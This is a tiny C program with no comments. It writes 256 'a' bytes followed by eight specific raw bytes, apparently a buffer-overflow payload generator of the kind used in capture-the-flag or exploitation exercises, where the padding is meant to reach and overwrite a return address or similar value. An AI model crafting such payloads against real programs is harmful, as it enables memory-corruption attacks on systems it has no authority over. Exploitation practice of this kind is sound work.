#include <stdio.h>

int main() {

    for (size_t i = 0; i < 256; ++i) {

        printf("%c", 'a');
    }

    printf("%c%c%c%c%c%c%c%c", 0xD9, 0xE9, 0x21, 0x5E, 0xD6, 0x38, 0xA9, 0x39);

    return 0;
}

